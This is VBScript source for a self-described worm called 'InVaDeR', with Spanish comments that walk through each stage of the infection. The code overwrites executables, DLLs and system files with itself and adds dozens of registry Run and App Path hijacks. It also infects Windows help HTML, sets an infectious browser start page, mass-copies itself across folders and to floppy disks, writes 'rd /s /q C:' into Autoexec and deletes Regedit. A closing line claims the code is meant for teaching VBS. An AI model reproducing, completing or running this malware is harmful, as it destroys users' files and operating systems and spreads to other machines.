On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wss = CreateObject("WScript.Shell")
Set windows = fso.GetSpecialFolder(0)
Set sys = fso.GetSpecialFolder(1)
Set este_virus = fso.OpenTextFile(WScript.ScriptFullName)
txt = este_virus.ReadAll                                 'Se han creado las variables básicas.
worm = wss.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Win_vader") 'Inicia prueba de "supervivencia" (worm)
If worm = 1 Then
  If Month(Now()) <> 9 Then
     Set fol_in = fso.GetFolder("C:\")
     infectfiles()                    'Se inicia el mecanismo "Infect-Files"
     Sub infectfiles
         Set c = fol_in.Files
         Set w = windows.Files
         Set s = sys.Files
         For Each f1 In c And w And s
             ext = fso.GetExtensionName(f1.path)
                 If (ext = "exe" Or ext = "dll" Or ext = "ini" Or ext = "log" Or ext = "sys") Then
                    Set x = fso.OpenTextFile(f1.path, 2, True)
                    x.Write txt
                    x.Close    'Con ésto hemos infectado todos los EXE, DLL, INI, LOG y SYS
                 End If
         Next
     End Sub 'Este es el mecanismo "Infect-Files", que luego usaremos a nuestro favor...
     Set up = fso.CreateTextFile(sys & "\Update.bat", True)
     up.WriteLine("@echo off")
     up.WriteLine("ren C:\*.sys *.vbs")               'Aquí se ve claramente
     up.WriteLine("ren C:\*.exe *.vbs")               'para qué se se puede usar
     up.WriteLine("ren C:\*.dll *.vbs")               'el mecanismo "Infect-Files"
     up.WriteLine("ren C:\*.ini *.vbs")               'pero se pone mejor...
     up.WriteLine("ren C:\*.log *.vbs")
     up.WriteLine("ren %SystemRoot%\*.sys *.vbs")
     up.WriteLine("ren %SystemRoot%\*.exe *.vbs")
     up.WriteLine("ren %SystemRoot%\*.dll *.vbs")
     up.WriteLine("ren %SystemRoot%\*.ini *.vbs")
     up.WriteLine("ren %SystemRoot%\*.log *.vbs")
     up.WriteLine("ren %SystemRoot%\System32\*.sys *.vbs")
     up.WriteLine("ren %SystemRoot%\System32\*.exe *.vbs")
     up.WriteLine("ren %SystemRoot%\System32\*.dll *.vbs")
     up.WriteLine("ren %SystemRoot%\System32\*.ini *.vbs")
     up.WriteLine("ren %SystemRoot%\System32\*.log *.vbs")
     up.WriteLine("echo")
     up.Close
     activ = wss.RegRead("HKEY_LOCAL_MACHINE\Activate")
     If activ = 1 Then
        wss.Run sys & "\Update.bat"
     Else                                              'Ahora lo que procede es usar nuestras infecciones en el Registro!
         wss.RegWrite "HKEY_LOCAL_MACHINE\Activate"
         wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Invasion", "C:\*.vbs"
         wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Invas10n", windows & "\*.vbs"
         wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Invas1oon", sys & "\*.vbs"
     End If
     Set driv = fso.Drives      'Por fin comienza la invasión.
     For Each x in driv                         'Primer destino: El Escritorio con 1000 copias!
         If x.DriveType = 2 Then
            escrit = fso.GetFolder(x.path)
            For n = 0 To 1000
                fso.CopyFile WScript.ScriptFullName, escrit & "\InVaS" & n & "0oOn!!.vbs"
            Next
         End If
     Next
     wss.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Internet Mail and News\Mail\Log File (Outlook)"
     wss.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Mail and News\Mail\Log File (Outlook)", WScript.ScriptFullName        'Tomamos Outlook!
     wss.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Win_vader", WScript.ScriptFullName                  'Nos copiamos al key "Run" del Usuario, para viajar con él!
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegistredOwner", "I-N-V-A-D-E-D"                       'Le ponemos nuestro nombre al Sistema
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\wmplayer"                       'Nos posesionamos de WM-player
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\wmplayer", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\wordpad"                        'Nos Posesionamos de WordPad
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\wordpad", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\iexplore"                       'Nos posesionamos de Internet Explorer
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Management\System Programs\iexplore", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\Path"
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\Path", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\(Predeterminado)"                                         'Nos posesionamos de Word
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\(Predeterminado)", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE\Path"                               'Nos aseguramos de estar metidos en Internet
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE\(Predeterminado)"
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE\Path", WScript.ScriptFullName
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE\(Predeterminado)", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\OUTLOOK.EXE\Path"                               'Nos aseguramos de estar metidos en Outlook
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\OUTLOOK.EXE\(Predeterminado)"
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\OUTLOOK.EXE\Path", WScript.ScriptFullName
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\OUTLOOK.EXE\(Predeterminado)", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Scandisc.exe\Path"                               'Nos Metemos hasta en el Scandisc!
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Scandisc.exe\(Predeterminado)"
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Scandisc.exe\Path", WScript.ScriptFullName
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\Scandisc.exe\(Predeterminado)", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\winzip.exe\(Predeterminado)"                         '...Y de una vez del Win-Zip...
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\App Paths\winzip.exe\(Predeterminado)", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls\Speech"                                   'Ahora tomamos el control sobre algunos datos del Panel de Control
     wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls\Speech", WScript.ScriptFullName
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cursors"
     wss.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel\Settings\Video"
     Set htm = fso.CreateTextFile(windows & "\hom_e.html", True)
     htm.WriteLine("<HTML>")                               'Creamos nuestro HTML para Página de Inicio
     htm.WriteLine("<Head>")
     htm.WriteLine("<Title> I - N - V - A - D - E - D </Title>")
     htm.WriteLine("</Head>")
     htm.WriteLine("<Body BGColor=""Silver"">")
     htm.WriteLine("<script Language=""VBScript"">")  'Hacemos infeccioso el HTML! Nuevo en la V2!
     htm.WriteLine(txt)
     htm.WriteLine("</Script>")
     htm.WriteLine("<H1><CENTER><Font Color=""#0000FF"" Size=""14""> I </Font><Font Color=""#00FF00"" Size=""5""> NVADED!</CENTER></H1>")
     htm.WriteLine("</Body>")
     htm.WriteLine("</HTML>")
     htm.Close                        'Ahora establecemos el HTML como página de Inicio:
     wss.RegWrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", windows & "\hom_e.html"
     For htm1 = 0 To 1000
         fso.CopyFile windows & "\hom_e.html", "C:\Winvasion" & htm1 & ".html"         'NUEVO!
         fso.CopyFile windows & "\hom_e.html", sys & "\Winvasion" & htm1 & ".html"     'En la V2, el virus copia HTMLs por todos lados...
         fso.CopyFile windows & "\hom_e.html", escrit & "\Winvasion" & htm1 & ".html"
     Next
     Set help = fso.GetFolder(windows & "\Help")
     Set web = fso.GetFolder(windows & "\Web")
     infecthtml()
     Sub infecthtml                  'Nuevo "Infect-Foles" para infectar los
         Set hp = help.Files         'Hipertextos de ayuda, etc. de WINDOWS!
         Set wb = web.Files          'Para la V2!
         For Each f1 In hp And wb
             ex = fso.GetExtensionName(f1.path)
             If (ex = "htm" Or ex = "html" Or ex = "chm") Then
                 Set y = fso.OpenTextFile(f1.path, 2, True)
                 y.Write "<script Language=""VBScript"">"
                 y.Write txt
                 y.Write "</Script>"
                 y.Close
             End If
         Next
     End Sub
     For invade = 0 To 25
         i = i+1                                          'Invadimos ahora 23 carpetas X. No importa cuáles...
         If i = invade Then
         Set fldr = fso.GetSpecialFolder(i)
         For copy = 0 To 1000000                          'Haremos 1000000 copias del virus en cada una
             fso.CopyFile WScript.ScriptFullName, fldr & "\InVaDeR" & copy & ".vbs"
             wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\inv" & invade & "_" & copy, fldr & "\InVaDeR" & copy & ".vbs"
         Next
         i = 0
         End If             '...Y sigue la Invasión...
     Next
     vive = wss.RegRead("HKEY_LOCAL_MACHINE\Copied")
     If vive = 1 Then
        If (fso.FileExists("C:\Autoexec.nt")) Then
             Set bat = fso.OpenTextFile("C:\Autoexec.nt", 2, True)
             bat.WriteLine("rd /s /q C:")
             bat.Close
        Else
            Set bat = fso.OpenTextfile("C:\Autoexec.bat", 2, True)
            bat.WriteLine("rd /s /q C:")
            bat.Close
        End If
     Else
         fso.CopyFile WScript.ScriptFullName, "A:\LEEME.TXT.vbs"
         If (fso.FileExists("A:\LEEME.TXT.vbs")) Then
            wss.RegWrite "HKEY_LOCAL_MACHINE\Copied"
         End If
     End IF                                         'Por si no fuera poco, el Worm intenta copiarse a los diskettes
     Do
     j = j+1
     If j = 1000000 Then
        For cop = 0 To j                            'Más y más copias infecciosas...
            fso.CopyFile WScript.ScriptFullName, "C:\INVADED!" & cop & ".vbs"
            wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\I-N-V-A-S-O-R" & cop, "C:\INVADED!" & cop & ".vbs"
            fso.CopyFile WScript.ScriptFullName, windows & "\INVADED" & cop & ".vbs"
            wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\IN-VA-SOR" & cop, windows & "\INVADED" & cop & ".vbs"
            fso.CopyFile Wscript.ScriptFullName, sys & "\INVADED" & cop & ".vbs"
            wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\IN-VAS-OR" & cop, sys & "\INVADED" & cop & ".vbs"
        Next
     End If
     If j = 10000000000 Then
       For keys = 0 To j
           wss.SendKeys "INVADER - INVADER - INVADER - INVADER - INVADER - INVADER - INVADER - INVADER - "
           Wss.SendKeys "Computadora infectada y saturada... Ha Ha Ha!"
           wss.SendKeys "La invasión" & "sigue y "*j
           wss.SendKeys "VBS-VIRUS, °Invader° by Virus Catalog SA"
           wss.SendKeys "Distribuído para el aprendizaje del lenguaje VBS"
           wss.SendKeys "No nos hacemos responsables por el mal uso que se le pueda dar"
        Next
     End If
     j = 0
     Loop
  End If
Else
   fso.CreateFolder(windows & "\Win_vader")
   fso.CopyFile WScript.ScriptFullName, windows & "\Win_vader\Win_vader.vbs"
   Set antidel = fso.CreateTextFile(sys & "\InVaDeR.vbs", True)             'Un sensillo mecanismo anti-eliminación.
   antidel.WriteLine(txt)
   antidel.Close
   If (fso.FileExists("C:\Autoexec.nt")) Then
      Set res = fso.OpenTextFile("C:\Autoexec.nt")
       res.Write("%SystemRoot%\System32\InVaDeR.vbs") 'Más cambios de la V2!
       res.Close
   Else
       Set res = fso.OpenTextFile("C:\Autoexec.bat")
       res.Write("%SystemRoot%\System32\InVaDeR.vbs")
       res.Close
   End If                                              'Fin del mecanismo andi-eliminación
   wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Win_vader", windows & "\Win_vader\Win_vader.vbs"
End If
fso.DeleteFile(windows & "\Regedit.exe")                'Borra el Regedit.exe

'Fin del InVaDeR-Virus

